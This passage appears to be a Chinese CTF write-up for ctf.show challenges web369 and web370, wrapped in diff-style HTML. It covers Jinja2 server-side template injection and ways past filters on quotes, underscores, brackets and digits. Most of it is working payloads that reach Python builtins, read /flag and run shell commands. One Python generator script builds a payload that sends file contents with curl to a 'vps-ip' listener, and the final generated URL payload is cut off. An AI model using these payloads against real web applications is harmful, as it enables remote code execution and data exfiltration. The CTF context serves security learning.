+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造__getitem__
+</span></span><span class="line"><span class="cl">{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造__builtins__
+</span></span><span class="line"><span class="cl">{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//【构造】q.__init__.__globals__.__getitem__.__builtins__
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造chr函数
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 构造/flag
+</span></span><span class="line"><span class="cl">{% set f=chr(47)~(dict(flag=a)|join)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//读取文件/flag
+</span></span><span class="line"><span class="cl">{% print(x.open(f).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload2执行命令cat-flag" class="headerLink">
+    <a href="#payload2%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4cat-flag" class="header-mark"></a>payload2：执行命令<code>cat /flag</code></h4><p>相当于<code>lipsum.__globals__['__builtins__'].open('/flag').read()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={% print (lipsum|attr(
+</span></span><span class="line"><span class="cl">(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
+</span></span><span class="line"><span class="cl">))
+</span></span><span class="line"><span class="cl">.get(
+</span></span><span class="line"><span class="cl">(config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
+</span></span><span class="line"><span class="cl">)
+</span></span><span class="line"><span class="cl">.popen(
+</span></span><span class="line"><span class="cl">(config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()
+</span></span><span class="line"><span class="cl">).read() %}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload3执行命令cat-flag" class="headerLink">
+    <a href="#payload3%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4cat-flag" class="header-mark"></a>payload3：执行命令<code>cat /flag</code></h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//构造下划线_
+</span></span><span class="line"><span class="cl">?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%}
+</span></span><span class="line"><span class="cl">{%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%}
+</span></span><span class="line"><span class="cl">{%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%}
+</span></span><span class="line"><span class="cl">{%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%}
+</span></span><span class="line"><span class="cl">{%set oo=dict(o=a,s=a)|join%}
+</span></span><span class="line"><span class="cl">{%set pp=dict(po=a,pen=a)|join%}
+</span></span><span class="line"><span class="cl">{%set space=chcr(32)%}
+</span></span><span class="line"><span class="cl">{%set xiegang=chcr(47)%}
+</span></span><span class="line"><span class="cl">{%set f1ag=dict(fl=a,ag=a)|join%}
+</span></span><span class="line"><span class="cl">{%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%}
+</span></span><span class="line"><span class="cl">{%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web370过滤args_osrequest数字" class="headerLink">
+    <a href="#web370%e8%bf%87%e6%bb%a4args_osrequest%e6%95%b0%e5%ad%97" class="header-mark"></a>[web370]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字</h3><p>以web369的payload进行修改：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set po=dict(po=1,p=2)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(24)%}
+</span></span><span class="line"><span class="cl">{% set re=dict(reque=1,st=1)|join%}
+</span></span><span class="line"><span class="cl">{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
+</span></span><span class="line"><span class="cl">{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set f=chr(47)~(dict(flag=a)|join)%}
+</span></span><span class="line"><span class="cl">{% print(x.open(f).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload1全角数字绕过" class="headerLink">
+    <a href="#payload1%e5%85%a8%e8%a7%92%e6%95%b0%e5%ad%97%e7%bb%95%e8%bf%87" class="header-mark"></a>payload1：全角数字绕过</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用全角数字替换payload中的半角数字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set po=dict(po=１,p=２)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(２４)%}
+</span></span><span class="line"><span class="cl">{% set re=dict(reque=１,st=１)|join%}
+</span></span><span class="line"><span class="cl">{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
+</span></span><span class="line"><span class="cl">{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set f=chr(４７)~(dict(flag=a)|join)%}
+</span></span><span class="line"><span class="cl">{% print(x.open(f).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload2构造数字" class="headerLink">
+    <a href="#payload2%e6%9e%84%e9%80%a0%e6%95%b0%e5%ad%97" class="header-mark"></a>payload2：构造数字</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set cc=(dict(ee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccc=(dict(eeee=a)|join|length)%}
+</span></span><span class="line"><span class="cl">从而cc=2,cccc=4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">再{% set coun=(cc~cccc)|int%}  --&gt;  coun=24
+</span></span><span class="line"><span class="cl">快速得到一个数值
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以，构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set ershisi=(cc~cccc)|int%}
+</span></span><span class="line"><span class="cl">{% set po=dict(po=c,p=c)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(ershisi)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">等效于：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|pop(24)%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set c=(dict(e=a)|join|count)%} 
+</span></span><span class="line"><span class="cl">{% set cc=(dict(ee=a)|join|count)%} 
+</span></span><span class="line"><span class="cl">{% set ccc=(dict(eee=a)|join|count)%} 
+</span></span><span class="line"><span class="cl">{% set cccc=(dict(eeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccccccc=(dict(eeeeeee=a)|join|count)%} 
+</span></span><span class="line"><span class="cl">{% set cccccccc=(dict(eeeeeeee=a)|join|count)%} 
+</span></span><span class="line"><span class="cl">{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% set twoandfour=(cc~cccc)|int%}
+</span></span><span class="line"><span class="cl">{% set fourandseven=(cccc~ccccccc)|int%} 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% set po=dict(po=b,p=b)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(twoandfour)%}
+</span></span><span class="line"><span class="cl">{% set re=dict(reque=b,st=b)|join%}
+</span></span><span class="line"><span class="cl">{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
+</span></span><span class="line"><span class="cl">{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set f=chr(fourandseven)~(dict(flag=a)|join)%}
+</span></span><span class="line"><span class="cl">{% print(x.open(f).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload3index构造数字" class="headerLink">
+    <a href="#payload3index%e6%9e%84%e9%80%a0%e6%95%b0%e5%ad%97" class="header-mark"></a>payload3：index构造数字</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set o=(dict(o=z)|join) %}
+</span></span><span class="line"><span class="cl">{% set n=dict(n=z)|join %}
+</span></span><span class="line"><span class="cl">{% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %}
+</span></span><span class="line"><span class="cl">{% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %}
+</span></span><span class="line"><span class="cl">{% set xiegang=(config|string|list).pop(-liushisi) %}
+</span></span><span class="line"><span class="cl">{% set gang=(()|select|string|list).pop(ershisi) %}
+</span></span><span class="line"><span class="cl">{% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %}
+</span></span><span class="line"><span class="cl">{% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %}
+</span></span><span class="line"><span class="cl">{% set gangfulaige=(xiegang,dict(flag=z)|join)|join %}
+</span></span><span class="line"><span class="cl">{% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload4反弹shell" class="headerLink">
+    <a href="#payload4%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>payload4：反弹shell</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">cmd=&#39;__import__(&#34;os&#34;).popen(&#34;curl http://vps-ip:9023?p=`cat /flag`&#34;).read()&#39;
+</span></span><span class="line"><span class="cl">def fun1(s):
+</span></span><span class="line"><span class="cl">	t=[]
+</span></span><span class="line"><span class="cl">	for i in range(len(s)):
+</span></span><span class="line"><span class="cl">		t.append(ord(s[i]))
+</span></span><span class="line"><span class="cl">	k=&#39;&#39;
+</span></span><span class="line"><span class="cl">	t=list(set(t))
+</span></span><span class="line"><span class="cl">	for i in t:
+</span></span><span class="line"><span class="cl">		k+=&#39;{% set &#39;+&#39;e&#39;*(t.index(i)+1)+&#39;=dict(&#39;+&#39;e&#39;*i+&#39;=a)|join|count%}\n&#39;
+</span></span><span class="line"><span class="cl">	return k
+</span></span><span class="line"><span class="cl">def fun2(s):
+</span></span><span class="line"><span class="cl">	t=[]
+</span></span><span class="line"><span class="cl">	for i in range(len(s)):
+</span></span><span class="line"><span class="cl">		t.append(ord(s[i]))
+</span></span><span class="line"><span class="cl">	t=list(set(t))
+</span></span><span class="line"><span class="cl">	k=&#39;&#39;
+</span></span><span class="line"><span class="cl">	for i in range(len(s)):
+</span></span><span class="line"><span class="cl">		if i&lt;len(s)-1:
+</span></span><span class="line"><span class="cl">			k+=&#39;chr(&#39;+&#39;e&#39;*(t.index(ord(s[i]))+1)+&#39;)%2b&#39;
+</span></span><span class="line"><span class="cl">		else:
+</span></span><span class="line"><span class="cl">			k+=&#39;chr(&#39;+&#39;e&#39;*(t.index(ord(s[i]))+1)+&#39;)&#39;
+</span></span><span class="line"><span class="cl">	return k
+</span></span><span class="line"><span class="cl">url =&#39;http://fc5ded74-98ba-4d98-a6f9-47ab2616ba41.challenge.ctf.show/?name=&#39;+fun1(cmd)+&#39;&#39;&#39;
+</span></span><span class="line"><span class="cl">{% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}
+</span></span><span class="line"><span class="cl">{% set po=dict(po=a,p=a)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(coun)%}
+</span></span><span class="line"><span class="cl">{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set cmd=&#39;&#39;&#39;+fun2(cmd)+&#39;&#39;&#39;
+</span></span><span class="line"><span class="cl">%}
+</span></span><span class="line"><span class="cl">{%if x.eval(cmd)%}
+</span></span><span class="line"><span class="cl">abc
+</span></span><span class="line"><span class="cl">{%endif%}
+</span></span><span class="line"><span class="cl">&#39;&#39;&#39;
+</span></span><span class="line"><span class="cl">print(url)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行脚本得到payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://2904f8f4-2f84-46b4-9f47-a720651f1578.challenge.ctf.show/?name={%%20set%20e=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20ee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%}%20{%%20set%20po=dict(po=a,p=a)|join%}%20{%%20set%20a=(()|select|string|list)|attr(po)(coun)%}%20{%%20set%20ini=(a,a,dict(init=a)|join,a,a)|join()%}%20{%%20set%20glo=(a,a,dict(globals=a)|join,a,a)|join()%}%20{%%20set%20geti=(a,a,dict(getit